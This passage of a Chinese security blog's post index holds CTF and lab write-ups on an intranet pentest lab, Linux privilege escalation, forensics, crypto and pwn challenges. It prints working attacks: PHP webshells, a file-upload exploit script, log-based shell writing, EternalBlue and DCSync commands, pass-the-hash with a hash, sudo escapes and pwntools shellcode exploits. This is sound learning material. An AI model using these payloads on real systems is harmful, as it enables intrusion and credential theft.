0xCB, 0x11, 0x02, 0xC4, 0x17, 0xF7, 0x1B, 0x8F, 0x67, 0x52]\ne={}\nbase=0x977040\ndef parse_int(s):\n  if '0x' in s:\n    return int(s,16)\n  else:\n    return int(s)\nfor i in d:\n  i=i.strip().strip(';')\n\n  if '-' in i:\n    if ('--' in i):\n      value=1\n      addr=int(i.strip('-'),16)-base\n    else:\n      value=parse_int(i.split('-=')[1].strip(';u'))\n      addr=int(i.split()[0],16)-base\n    state=0\n  elif '^' in i:\n    value=parse_int(i.split('^=')[1].strip(';u'))\n    addr=int(i.split()[0],16)-base\n    state=1\n  elif '+' in i:\n    if ('++' in i):\n      value=1\n      addr=int(i.strip('+'),16)-base\n    else:\n      value=parse_int(i.split('+=')[1].strip(';u'))\n      addr=int(i.split()[0],16)-base\n    state=2\n  else:\n    continue\n  if (e.get(addr)==None):\n    e[addr]=[]\n  e[addr].append((state,value))\n\nprint(e[0])\nfor i in e:\n  if i>=len(data):\n    continue\n  for state,value in e[i][::-1]:\n    # print(state,value)\n    if state==0:\n      data[i]+=value\n    elif state==1:\n      data[i]^=value\n    elif state==2:\n      data[i]-=value\n    data[i]=data[i]&0xff\nprint(bytes(data))\n```\n\n# crypto\n\n\n## Three-prime RSA\n\n从 r_cubed 恢复 r\n\n`r = int(round(r_cubed ** (1/3)))`\n\n从 D 中恢复 (p+q+r) 和 random_num\n 题目中 `random_num` 是一个 28 位质数，`p+q+r` 大约 512~514 位。因为 `(p+q+r)*random_num < n`，所以 `D` 没有取模的影响：\n\n```python\nrandom_num = 254766409  # 可通过简单分解D得到\ns = D // random_num     # 得到 s = p + q + r\n```\n\n求p+q\n\n`p_plus_q = s - r`\n\n解一元二次方程得到 p 和 q\n 方程：`x^2 - (p+q)x + p*q = 0`\n\n```py\nfrom sympy import symbols, solve\nx = symbols('x')\nsols = solve(x**2 - p_plus_q*x + pq, x)\np, q = int(sols[0]), int(sols[1])\n\n```\n\n计算 d 并解密\n\n```py\nfrom Crypto.Util.number import long_to_bytes, inverse\ne = 65537\nd = inverse(e, (p-1)*(q-1)*(r-1))\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag)\n\n```\n\n`DASCTF{5521a971-9bed-11ef-bfda-14ac6024b6a8}`\n\n","tags":["wp","宁波","2025竞赛"],"categories":["wp"]},{"title":"内网渗透学习(域横向移动篇)","url":"/posts/dcf6516b/","content":"\n\n目录结构参考的是[The Hacker Recipes](https://www.thehacker.recipes/)\n因为内容太多就分几篇来总结了\n\n---\n\n\n## [域渗透学习(Credentials篇)](/posts/e0ff8995/)\n## [域渗透学习(NTLM篇)](/posts/3f5b8fbe/)\n\n\n\n","tags":["总结","内网渗透","域"],"categories":["总结"]},{"title":"春秋云境 Initial","url":"/posts/5a3650d1/","content":"\n开始签到白嫖打完所有靶机计划!\n\n>Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。\n\n前置知识:\n\n[内网渗透学习(代理篇)](/posts/52375b43/)\n[域渗透学习(Credentials篇)](/posts/e0ff8995/)\n[域渗透学习(NTLM篇)](/posts/3f5b8fbe/)\n[linux提权笔记](/posts/fcb3a8d7/)\n\n\n# 入口（172.22.1.15）\n\n根据报错信息得知是ThinkPHP 5，存在nday，可以getshell\n\n![](/img/内网/ichunqiu/Initial-1.png)\n\n写马后查看用户是 www-data 尝试sudo提权\n\n![](/img/内网/ichunqiu/Initial-3.png)\n\n\n发现mysql有权限，在gtfobins查询得到命令`sudo mysql -e '\\! /bin/sh'`\n\n![](/img/内网/ichunqiu/Initial-4.png)\n\n\n得到flag1：`flag01: flag{60b53231-`\n\n\n# 内网\n\n查看入口主机IP是 172.22.1.15\n\n![](/img/内网/ichunqiu/Initial-2.png)\n\n上传fscan扫C段\n\n\n![](/img/内网/ichunqiu/Initial-5.png)\n\n\n一共三台主机，信呼OA，存在ms17-010的windows和一台DC域控\n\n\n\n上传iox构建socks代理\n\n```bash\n./iox proxy -l 6666\n```\n\n\n## 信呼OA（172.22.1.18）\n\n\n存在弱口令使用`admin/admin123`登录\n\n版本是v2.2.8，有[文件上传漏洞](https://blog.csdn.net/solitudi/article/details/118675321)\n\n\n先在脚本同目录放一个1.php\n\n```php\n<?=eval($_POST[1]);?>\n```\n\nexp，注意几个传参\n\n```python\nimport requests\n\n\nsession = requests.session()\n\nurl_pre = 'http://172.22.1.18/'\nurl1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'\nurl2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'\nurl3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'\n\ndata1 = {\n    'rempass': '0',\n    'jmpass': 'false',\n    'device': '1625884034525',\n    'ltype': '0',\n    'adminuser': 'YWRtaW4=',\n    'adminpass': 'YWRtaW4xMjM=',\n    'yanzm': ''\n}\n\n\nr = session.post(url1, data=data1)\nr = session.post(url2, files={'file': open('1.php', 'r+')})\n\nfilepath = str(r.json()['filepath'])\nfilepath = \"/\" + filepath.split('.uptemp')[0] + '.php'\nid = r.json()['id']\nprint(id)\nprint(filepath)\nurl3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'\n\nr = session.get(url3)\nr = session.get(url_pre + filepath + \"?1=system('dir');\")\nprint(r.text)\n```\n\n成功上传shell\n\n![](/img/内网/ichunqiu/Initial-7.png)\n\n\n得到flag2：`flag02: 2ce3-4813-87d4-`\n\n![](/img/内网/ichunqiu/Initial-8.png)\n\n\n---\n\n另一种打法\n\n这台机子还部署了phpmyadmin\n\n\n![](/img/内网/ichunqiu/Initial-6.png)\n\n\n恰好`root/root`弱口令可以登录\n\n\n查看目录\n\n```sql\nselect @@basedir;\n```\n\n![](/img/内网/ichunqiu/Initial-9.png)\n\n查看是否开启日志以及存放的日志位置\n\n\n```sql\nshow variables like 'general%';\n```\n\n![](/img/内网/ichunqiu/Initial-10.png)\n\n\n开启日志\n\n```sql\nset global general_log = ON;\n```\n\n设置日志保存位置\n\n```sql\nset global general_log_file = \"C:/phpStudy/PHPTutorial/www/a.php\"\n```\n\n![](/img/内网/ichunqiu/Initial-11.png)\n\n写入shell\n\n```sql\nselect '<?php eval($_POST[a]);?>';\n```\n\ngetshell\n\n![](/img/内网/ichunqiu/Initial-12.png)\n\n\n## DC（172.22.1.2）\n\nfscan扫出来有ms17-010，直接用msfconsole打\n\n\n```bash\nproxychains4 msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp_uuid\nset RHOSTS 172.22.1.21\nexploit\n```\n\n![](/img/内网/ichunqiu/Initial-13.png)\n\n加载mimikatz(kiwi就是msf内置的mimikatz模块的升级版)\n通过DCSync导出域内哈希\n\n```bash\nload kiwi\nkiwi_cmd \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit\n```\n\n![](/img/内网/ichunqiu/Initial-14.png)\n\n抓到了Administrator的hash，加上之前扫出来 DC(172.22.1.2) 的 445 端口是开放的，可以利用 smb 哈希传递拿下域控制器\n\n使用 crackmapexec 来进行PTH\n\n```bash\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \"type C:\\Users\\Administrator\\flag\\flag03.txt\"\n```\n\n![](/img/内网/ichunqiu/Initial-15.png)\n\n\n得到flag3：`flag03: e8f88d0d43d6}`","tags":["内网渗透","春秋云境","专业徽章","DCSync"],"categories":["内网渗透"]},{"title":"linux提权笔记","url":"/posts/fcb3a8d7/","content":"\n记录在比赛和靶场中遇到的提权方法\n\n推荐本地部署一个[GTFOBins](https://github.com/GTFOBins/GTFOBins.github.io)用来查询\n\n\n# suid 提权\n\n>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限\n\n查找当前系统上文件属主为 root 并且拥有 SUID 权限的可执行文件\n\n```bash\nfind / -user root -perm -4000 -print 2> result.txt\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls {} \\; 2>/dev/null\n```\n\n找到命令后可以在GTFOBins查找用法\n\n\n\n\n# sudo 提权\n\n## 权限分配不当\n\n>sudo（super user do）是linux系统中用于管理用户权限的工具，允许普通用户在无需切换到超级用户的情况下以root身份执行命令，通常，在使用sudo命令时，用户需要输入自己的密码验证自己是否有权限使用\n\n查看可利用的sudo权限工具\n\n```bash\nsudo -l\n```\n\n然后在gtfobins查询利用方法\n\n例子：\n\n![](/img/linux/sudo-1.png)\n\n![](/img/linux/sudo-2.png)\n\n\n\n\n## CVE-2019-14287\n\n1.8.28之前的sudo版本均会受到影响\n\n现在的用户alice没权限看flag文件\n\n![](/img/linux/CVE-2019-14287-1.jpg)\n\n查看sudo版本\n\n![](/img/linux/CVE-2019-14287-2.jpg)\n\n符合利用条件，payload：`sudo -u#-1 /bin/bash`\n\n![](/img/linux/CVE-2019-14287-3.jpg)\n\n","tags":["总结","提权"],"categories":["总结"]},{"title":"第八届西湖论剑中国杭州网络安全安全技能大赛初赛 部分wp","url":"/posts/74a23a1b/","content":"\n# ds\n\n## easydatalog\n\n分析`error.log`发现首先上传了木马，然后用蚁剑进行连接\n\n全局搜索发现包含一个zip和jpg\n\n![](/img/wp/2025/xhlj-easydatalog-2.png)\n\n压缩包数据很少直接手动提取出来，图片数据太多用脚本提取出来\n\n```python\nimport re\n\n\ndef extract_jpg_data(log_file):\n    # 读取日志文件内容\n    with open(log_file, 'r') as f:\n        content = f.read()\n\n    lines = content.split('\\n')\n    hex_data = []\n\n    for line in lines:\n        # 跳过包含readbytes或bytes的行\n        if 'readbytes' in line or 'bytes' in line:\n            continue\n\n        # 如果行包含dumpio_in或dumpio_out\n        if 'dumpio_in' in line or 'dumpio_out' in line:\n            # 提取冒号后的内容\n            parts = line.split('dumpio_in (data-HEAP): ', maxsplit=1)\n            if len(parts) > 1:\n                data = parts[1].strip()\n            else:\n                parts = line.split('dumpio_out (data-HEAP): ', maxsplit=1)\n                if len(parts) > 1:\n                    data = parts[1].strip()\n                else:\n                    continue\n\n            hex_data.append(data)\n\n    data = ''.join(hex_data)\n\n    # 查找jpg数据（从FFD8到FFD9）\n    jpg_pattern = r'FFD8FFE0.*?00FFD9'\n    jpg_matches = re.findall(jpg_pattern, data)\n\n    # 保存找到的jpg数据\n    for i, jpg_data in enumerate(jpg_matches):\n        binary_data = bytes.fromhex(jpg_data)\n        with open(f'out.jpg', 'wb') as f:\n            f.write(binary_data)\n\nif __name__ == '__main__':\n    extract_jpg_data('error.log')\n\n```\n\n图片盲水印得到密码\n\n![](/img/wp/2025/xhlj-easydatalog-1.png)\n\n用得到的密码`dataPersonPass123987`解压压缩包得到用户信息表\n\n拼接出张三的身份证号和手机号\n\n`30601319731003117X_79159498824`\n\n\n## DSASignatureData\n\ntshark筛选出所有的数据\n\n`tshark -r data.pcapng -T fields -e http.file_data  -e http.request.uri > data.txt`\n\n\n对筛选出来的数据进行整理，转成明文后去重和排序\n\n```python\nimport json\n\n\n# 将十六进制字符串转换为字节，然后解码为UTF-8字符串\ndef decode_hex_string(hex_string):\n    return bytes.fromhex(hex_string).decode('utf-8')\n\n\ndef process_data():\n    with open('data.txt', 'r', encoding='utf-8') as f:\n        lines = f.readlines()\n\n    result = []\n    seen = set()  # 用于记录已经处理过的数据\n\n    for line in lines:\n        if '/?userid=' in line:\n\n            json_hex = line.strip().split('\\t')[0]  # 提取JSON数据部分\n            try:\n                json_str = decode_hex_string(json_hex)\n                data = json.loads(json_str)\n                userid = line.split('/?userid=')[1].split()[0]\n                data['userid'] = userid\n\n                unique_key = (data['idcard'], data['phone'])\n\n                if unique_key not in seen:\n                    seen.add(unique_key)\n                    result.append(data)\n            except:\n                continue\n\n    print(f\"Found {len(result)} unique records\")\n\n    result.sort(key=lambda x: int(x['userid']))\n\n    with open('data_new.txt', 'w', encoding='utf-8') as f:\n        for data in result:\n            line = f\"{data['userid']},{data['name']},{data['idcard']},{data['phone']}\\n\"\n            f.write(line)\n\n\nif __name__ == '__main__':\n    process_data()\n```\n\n得到全部的数据\n\n```text\nuserid,name,idcard,phone\n1,侯俊英,532215199108067664,73457647068\n2,寇雪,637373199908267850,79311464433\n3,南郭映安,516067201404039268,79843161520\n4,仲长宗,690694198504259989,78927258687\n5,伏羲永琴,968155199102184917,78781034018\n6,班涵润,496980198102184431,73056859184\n7,丁映安,098529200809222274,79398505211\n8,通春雪,838747198907275515,74568181144\n...\n1996,东关燕子,864371198811109088,75589142337\n1997,桂秀慧,921145197101023429,73457033928\n1998,车钗,284617199806039673,74960899903\n1999,文浩渺,829973198603161976,73871235789\n2000,祁陈红,987193201007052887,74518763400\n```\n\n\n然后与data-sign.csv中的签名数据比较\n\n```python\nimport csv\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import dsa, utils\nfrom cryptography.hazmat.primitives.serialization import load_pem_public_key\nfrom cryptography.exceptions import InvalidSignature\nimport base64\n\n\ndef load_public_key(userid):\n    \"\"\"加载用户的公钥\"\"\"\n    userid_padded = str(userid).zfill(4)\n    with open(f'public/public-{userid_padded}.pem', 'rb') as f:\n        key_data = f.read()\n        return load_pem_public_key(key_data)\n\n\ndef verify_signature(public_key, message, signature):\n    \"\"\"验证签名\"\"\"\n    try:\n        # 解码Base64签名\n        signature_bytes = base64.b64decode(signature)\n\n        # 提取r和s值\n        r = int.from_bytes(signature_bytes[:20], 'big')\n        s = int.from_bytes(signature_bytes[20:], 'big')\n\n        # 计算消息哈希并编码签名\n        message_bytes = message.encode('utf-8')\n        encoded_signature = utils.encode_dss_signature(r, s)\n\n        # 验证签名\n        public_key.verify(\n            encoded_signature,\n            message_bytes,\n            hashes.SHA256()\n        )\n        return True\n    except (InvalidSignature, Exception):\n        return False\n\n\ndef verify_records():\n    \"\"\"验证所有记录\"\"\"\n    # 读取原始数据\n    original_data = {}\n    with open('data_new.txt', 'r', encoding='utf-8') as f:\n        next(f)  # 跳过标题行\n        for line in f:\n            userid, name, idcard, phone = line.strip().split(',')\n            original_data[userid] = {\n                'name': name,\n                'idcard': idcard,\n                'phone': phone\n            }\n\n    # 读取签名数据\n    signatures = {}\n    with open('data-sign.csv', 'r', encoding='utf-8') as f:\n        reader = csv.DictReader(f)\n        for row in reader:\n            userid = row['username']\n            signatures[userid] = {\n                'name_signature': row['name_signature'],\n                'idcard_signature': row['idcard_signature'],\n                'phone_signature': row['phone_signature']\n            }\n\n    # 验证每条记录\n    tampered_records = []\n    for userid, orig_data in original_data.items():\n        # 加载公钥\n        try:\n            public_key = load_public_key(userid)\n            sig_data = signatures[userid]\n\n            # 验证所有字段的签名\n            name_valid = verify_signature(public_key, orig_data['name'], sig_data['name_signature'])\n            idcard_valid = verify_signature(public_key, orig_data['idcard'], sig_data['idcard_signature'])\n            phone_valid = verify_signature(public_key, orig_data['phone'], sig_data['phone_signature'])\n\n            # 如果任何字段验证失败，记录该条数据\n            if not (name_valid and idcard_valid and phone_valid):\n                tampered_records.append({\n                    'userid': userid,\n                    'name': orig_data['name'],\n                    'idcard': orig_data['idcard'],\n                    'phone': orig_data['phone']\n                })\n        except Exception:\n            continue\n\n    return tampered_records\n\n\ndef main():\n    # 验证记录并获取被篡改的数据\n    tampered_records = verify_records()\n\n    # 将被篡改的记录写入CSV文件\n    if tampered_records:\n        with open('tampered_records.csv', 'w', encoding='utf-8', newline='') as f:\n            writer = csv.DictWriter(f, fieldnames=['userid', 'name', 'idcard', 'phone'])\n            writer.writeheader()\n            writer.writerows(tampered_records)\n        print(f\"Found {len(tampered_records)} tampered records. Details written to tampered_records.csv\")\n    else:\n        print(\"No tampered records found.\")\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n\n![](/img/wp/2025/xhlj-DSASignatureData.png)\n\n\n\n## easyrawencode\n\nvol2分析镜像\n\n\n搜常见后缀\n\n`python vol.py -f easyrawencode.raw --profile Win7SP1x64 filescan | grep -E \"txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag\"`\n\n发现hack.py\n\n`python vol.py -f easyrawencode.raw --profile Win7SP1x64 dumpfiles -Q  0x000000003dfdf070 -D ./`\n\n\n```python\nimport os\nimport hashlib\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\n\nhackkey = os.getenv('hackkey')\nif not hackkey:\n    raise ValueError(\"Environment variable 'hackkey' is not set\")\n\nwith open('private.pem', 'r') as f:\n    private_key = RSA.import_key(f.read())\npublic_key = private_key.publickey().export_key()\n\naes_key = hashlib.sha256(hackkey.encode()).digest()\n\nwith open('data.csv', 'rb') as f:\n    data = f.read()\n\ncipher_aes = AES.new(aes_key, AES.MODE_EAX)\nciphertext, tag = cipher_aes.encrypt_and_digest(data)\ncipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))\nenc_aes_key = cipher_rsa.encrypt(aes_key)\n\nwith open('encrypted_data.bin', 'wb') as f:\n    f.write(ciphertext)\n\nprint(enc_aes_key.hex())\nprint(cipher_aes.nonce.hex())\nprint(tag.hex())\n```\n\n\n根据代码分别查看`环境变量hackkey` `private.pem` `encrypted_data.bin`\n\n`python vol.py -f easyrawencode.raw --profile Win7SP1x64 envars | grep -E 'hackkey'`\n`python vol.py -f easyrawencode.raw --profile Win7SP1x64 filescan | grep -E \"private.pem|encrypted_data.bin\"`\n\n![](/img/wp/2025/xhlj-easyrawencode-1.png)\n\n\n还需要查看当时运行代码后输出的值\n\n`python vol.py -f easyrawencode.raw --profile Win7SP1x64 consoles`\n\n![](/img/wp/2025/xhlj-easyrawencode-2.png)\n\n\n根据得到的信息还原出data.csv\n\n\n```python\nimport hashlib\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\n\nhackkey = '4etz0hHbU3TgKqduFL'\naes_key = hashlib.sha256(hackkey.encode()).digest()\n\nnonce_hex = \"d919c229aab6535efa09a52c589c8f47\"\nnonce = bytes.fromhex(nonce_hex)\n\n\nwith open('encrypted_data.bin', 'rb') as f:\n    ciphertext = f.read()\n\ntry:\n    # 使用AES密钥解密数据，先不验证MAC\n    cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)\n    data = cipher_aes.decrypt(ciphertext)\n\n    with open('data.csv', 'wb') as f:\n        f.write(data)\n\n    print(\"解密完成，数据已保存到 data.csv\")\n\nexcept Exception as e:\n    print(\"解密过程中出现错误:\", str(e))\n\n```\n\n\n得到一份用户数据\n\n```csv\n编号,用户名,密码,姓名,性别,出生日期,个性签名(加密版)\n1,sWEbvrLvgyFO9u8,vHBhvVXS2JvLnTTo,胜屠翰池,男,19761023,korvy4fjEBP6AKeDValKDfzBRK9sKDSIHVakq3NXMMU3\n2,wangguizhi,3E8vleDJFC,桓玉珂,女,20050814,NF+z3NevQqWILNqNvUznlOFie3KLuhIztQNLFnRy\n3,kofxlSO1C3XEXP3QPH1lEg5WQ,4U86p3uzw7xV,崎邱炜,男,20000710,yutW+1ipTbce3pcz+BEIBS48fX7NF5hh8bWEdigYsHca3vo/dQ0Nl+YFmpl5UD4Onga0hGehitNvMrG4XNFdH+lHEg==\n4,caijijinotwo1f,PupkzhU9R0g4AoP,禹歆美,女,20120626,t02tKoybGWyIqYL133qtg4+yG3yRvNk=\n...\n1997,QV1lQhy1eYi6,s6oJFLTbRPG,公刘芳林,男,19950104,QMvnJnbRC8dbNNSBCX4ZJoFul2q4XilJXc9BQ/rG\n1998,9tk5p3Y,90909090tianxia,公休生文,男,19790402,RO7+27VoJ3Feb5uPhDmASe27URp9\n1999,40utHZEBKPmxiMO7VrE6CMm,vhathQj2XGSB,云阔,女,19930420,aaf/6mkYPho71FZAjGbRzjZOqx//FgT1fzMfLFzyBAtPQZf9KbMu/Teo/ANL9Ur09CgO5N0UV2+Gr1ncqLy5zZv0p+VhqJwvm7U4ypUyovY=\n2000,liuguiying,YeE8DXLSPMthwp,沈盈盈,男,19750412,g+1FWgFzuwHOLzZ7Qy1QVWtLhQoRVVQQhUSml8p/d6IeK6NG/8VFV+v0wqCHEIlYFVXtPSncSQ==\n```\n\n\n根据结构组成猜测aes等加密方法，最后通过rc4解出明文\n\n```python\nimport pandas as pd\nimport base64\n\ndata = pd.read_csv('data.csv')\npassword = data['密码']\nsignature = data['个性签名(加密版)']\n\n\ndef rc4_decrypt(ciphertext, key):\n    try:\n        ciphertext = base64.b64decode(ciphertext)\n        key = key.encode('utf-8')\n\n        S = list(range(256))\n        j = 0\n        for i in range(256):\n            j = (j + S[i] + key[i % len(key)]) % 256\n            S[i], S[j] = S[j], S[i]\n\n        i = j = 0\n        plaintext = bytearray()\n        for byte in ciphertext:\n            i = (i + 1) % 256\n            j = (j + S[i]) % 256\n            S[i], S[j] = S[j], S[i]\n            k = S[(S[i] + S[j]) % 256]\n            plaintext.append(byte ^ k)\n\n        return plaintext.decode('utf-8', errors='ignore')\n    except Exception as e:\n        print(f\"Debug - Key length: {len(key)}, Ciphertext length: {len(ciphertext)}\")\n        return f\"Decryption failed: {str(e)}\"\n\n\nfor i in range(len(password)):\n    result = rc4_decrypt(signature[i], password[i])\n    print(f\"Entry {i}: {result}\")\n    if 'DASCTF' in result:\n        print(f\"Found flag in entry {i}: {result}\")\n        break\n```\n\n\n![](/img/wp/2025/xhlj-easyrawencode-3.png)","tags":["wp","2025竞赛","西湖论剑"],"categories":["wp"]},{"title":"2024“中华武数杯”全国网络攻防精英赛RHG wp","url":"/posts/230fa1fb/","content":"\n\n第一次打RHG模式，i春秋的平台和在网上看到的不太一样，一轮是一小时，也可以手动一题一题做然后提交\n\n![](/img/wp/2024/2024zhwsb-rhg-1.png)\n\n\n写了个脚本获取题目信息然后下载，运行写好的exp然后提交flag（写不来自动分析漏洞，就人工代替ai）\n\n```python\n\"\"\"\n# -*- coding: utf-8 -*-\n# @Author: dr0n1\n# @Date:   2024/11/27\n# @link: https://www.dr0n.top/\n\"\"\"\n\nimport subprocess\nimport requests\nimport os\nimport re\nfrom time import sleep\n\ntoken = \"icqxxx\"\n\n\n# 获取题目信息\ndef search(token):\n    url = \"https://apiterminator.ichunqiu.com/xxx\"\n    headers = {\"user-agent\": \"Mozilla/5.0\"}\n    url = url + \"?token=\" + token\n    data = requests.get(url, headers=headers).json()\n    return data\n\n\n# 下载题目附件并解压\ndef download(file_url, title):\n    headers = {\"user-agent\": \"Mozilla/5.0\"}\n    res = requests.get(file_url, headers=headers)\n    os.makedirs('download', exist_ok=True)\n    zip_path = f'download/{title}.zip'\n\n    with open(zip_path, 'wb') as f:\n        f.write(res.content)\n\n    if os.name == 'nt':\n        subprocess.run(['powershell', 'Expand-Archive', '-Path', zip_path, '-DestinationPath', f'download/{title}', '-Force'])\n    else:\n        subprocess.run(['unzip', '-o', zip_path, '-d', f'download/{title}'])\n\n    print(f\"[+]{title}下载解压完成\")\n\n\n# 运行exp\ndef run(docker_ip, docker_port, title):\n    exp_dir = 'exp'\n    prefix = title.split('-')[0]\n    for filename in os.listdir(exp_dir):\n        if filename.startswith(prefix) and filename.endswith('.py'):\n            file_path = os.path.join(exp_dir, filename)\n            try:\n                process = subprocess.Popen(['python', file_path, docker_ip, str(docker_port)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n            except FileNotFoundError:\n                return None\n            stdout, stderr = process.communicate()\n            return stdout\n\n    print(f\"[-]{title} 没有对应exp\")\n    os.makedirs('exp', exist_ok=True)\n    open(f'exp/{prefix}.py', 'w').close()\n    return None\n\n\n# 提交flag\ndef get_flag(token, question_id, flag):\n    url = \"https://apiterminator.ichunqiu.com/xxx\"\n    url = url + \"?token=\" + token + \"&question_id=\" + question_id + \"&answer=\" + flag\n    headers = {\"user-agent\": \"Mozilla/5.0\"}\n    res = requests.get(url, headers=headers).json()\n    return res\n\n\n# 排名查询\ndef rank():\n    data = {\"team_name\": \"\", \"industry_id\": \"\", \"attribute_id\": \"\", \"page_index\": 1, \"page_size\": 10, \"k\": \"BjNQYA0-B2cKewQjUjcBJVdxD3lXPFRmVDRTbgcxXGpVagQ3W25QPVZh\", \"stamp\": 1732941812896, \"token\": \"login:match_1211:e5cedf979df76cda478bde52601c12d7\", \"rs\": \"83a994740e198e91d37f1f195a515412\"}\n    url = \"http://apiterminator.ichunqiu.com/match/rank/solved\"\n    headers = {\"user-agent\": \"Mozilla/5.0\", \"SIGN\": \"xxx\"}\n    res = requests.post(url, headers=headers, data=data).json()\n    return res\n\n\ndata = search(token)\nif data['code'] != 0:\n    print(\"[-]获取题目信息失败\")\n    exit()\nfor item in data['data']:\n    question_id = item['question_id']\n    title = item['title']\n    score = item['score']\n    real_score = item['real_score']\n    file_url = item['file_url']\n    is_solved = item['is_solved']\n    solved_number = item['solved_number']\n    docker_ip = item['docker_ip']\n    docker_port = item['docker_port']\n    flag_url = item['flag_url']\n    attribute = item['attribute']\n\n    if is_solved:\n        print(f\"[+]{title} 已解出\")\n    else:\n        download(file_url, title)\n        print(f\"[+]正在解决 {title}\")\n        flag = run(docker_ip, docker_port, title)\n\n        match = re.search(r'flag\\{.*}', str(flag))\n        if match:\n            flag = match.group()\n            print(f\"[+]{title} flag: {flag}\")\n            rsp = get_flag(token, question_id, flag)\n            code = rsp['code']\n            message = rsp['message']\n            if code == 0:\n                print(f\"[+]{title} 解题成功\")\n                print(f\"[+]{title} 已有{solved_number}次解出\")\n                print(f\"[+]{title} 得分{real_score}\")\n            else:\n                print(f\"[-]{title} 解题失败\")\n                print(f\"[-]{title} {message}\")\n        else:\n            print(f\"[-]{title} exp运行失败\")\n\n    print(\"---------------------------------------------------\")\n    sleep(1)\n\nrank = rank()\nfor item in rank['data']['lists']:\n    team_name = item['team_name']\n    school = item['school']\n    total_score = item['total_score']\n\n    print(f\"队伍: {team_name} 学校: {school} 总分: {total_score}\")\n\n```\n\n\n![](/img/wp/2024/2024zhwsb-rhg-2.png)\n\n\n不过每一轮就两题，手动也很快，脚本不是很必要\n\n\n# rhg3\n\n```python\nfrom pwn import *\n\np = remote(sys.argv[1], int(sys.argv[2]))\ne = ELF(\"./download/rhg3/bin\")\nbss = e.bss(0x300)\np.send(b'a' * 0x6c + p8(0x2d))\n\np.sendline(\"cat /flag\")\nprint(p.readuntil(\"}\"))\n\n```\n\n# rhg4\n\n\n```python\nfrom pwn import *\n\np = remote(sys.argv[1], int(sys.argv[2]))\np.sendline('4294967288')\n\np.sendline(\"cat /flag\")\nprint(p.readuntil(\"}\"))\n\n```\n\n# rhg5\n\n```python\nfrom pwn import *\n\np = remote(sys.argv[1], int(sys.argv[2]))\np.sendline('WWDDDADAD')\n\np.sendline(\"cat /flag\")\nprint(p.readuntil(\"}\"))\n\n```\n\n\n# rhg6\n\n```python\nfrom pwn import *\n\ncontext.arch = 'i386'\np = remote(sys.argv[1], int(sys.argv[2]))\n# gdb.attach(p)\n# pause()\nshellcode = asm('nop\\n' * 19 + shellcraft.sh())\nshellcode = bytes([i - 1 for i in shellcode])\np.send(shellcode)\n\np.sendline(\"cat /flag\")\nprint(p.readuntil(\"}\"))\n\n```\n\n\n# rhg7\n\n```python\nfrom pwn import *\nimport time\n\n\ndef add(size, data=b'\\n'):\n    p.sendlineafter(b'2.show', b'0')\n    p.sendline(str(size).encode())\n    time.sleep(0.5)\n    p.send(data)\n\n\ndef free(ind):\n    p.sendlineafter(b'2.show', b'1')\n    p.sendline(str(ind).encode())\n\n\ndef show(ind):\n    p.sendlineafter(b'2.show\\n', b'2')\n    p.sendline(str(ind).encode())\n    pass\n\n\n# p = process('./download/rhg7/bin')\np = remote(sys.argv[1], int(sys.argv[2]))\nsystem = 0x80488CE\nbin_sh = 0x080BCF4F\nadd(0x8)  # 0\nadd(0x18)  # 1\nfree(0)\nfree(1)\nadd(8, p32(bin_sh) + p32(system))\nshow(0)\n\np.sendline(\"cat /flag\")\nprint(p.readuntil(\"}\"))\n\n```\n\n# rhg8\n\n```python\nfrom pwn import *\n\np = remote(sys.argv[1], int(sys.argv[2]))\np.sendline('0')\np.sendline('0')\n\np.sendline(\"cat /flag\")\nprint(p.readuntil(\"}\"))\n\n```","tags":["wp","中华武数杯","2024竞赛","RHG"],"categories":["wp"]},{"title":"第七届浙江省大学生网络与信息安全竞赛决赛-WP","url":"/posts/f2e1654d/","content":"\n总榜Rank1，在毕业前拿到榜一也是圆满了 :)\n\n# web\n\n## wucanrce\n\n```php\n<?php\necho \"get只接受code欧,flag在上一级目录<br>\";\n$filename = __FILE__;\nhighlight_file($filename);\nif(isset($_GET['code'])){\n    if (!preg_match('/session_id\\(|readfile\\(/i', $_GET['code']))\n\n     {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['code'])) {\n                @eval($_GET['code']);\n            }\n\n    }\n    else{\n        die(\"不让用session欧，readfile也不行\");\n    }\n}\n?>\n```\n\n无参rce\n\n```php\n//查看上一级目录文件名\nprint_r(scandir(dirname(getcwd())));\n\n//读取上级目录文件\nshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));\n```\n\n\n\n## unserialize\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass AAA{\n    public $aear;\n    public $string;\n    public function __construct($a){\n        $this -> aear = $a;\n    }\n    function __destruct()\n    {\n        echo $this -> aear;\n    }\n    public function __toString()\n    {\n        $new = $this -> string;\n        return $new();\n    }\n\n}\n\nclass BBB {\n    private $pop;\n\n    public function __construct($string) {\n        $this -> pop = $string;\n    }\n\n    public function __get($value) {\n        $var = 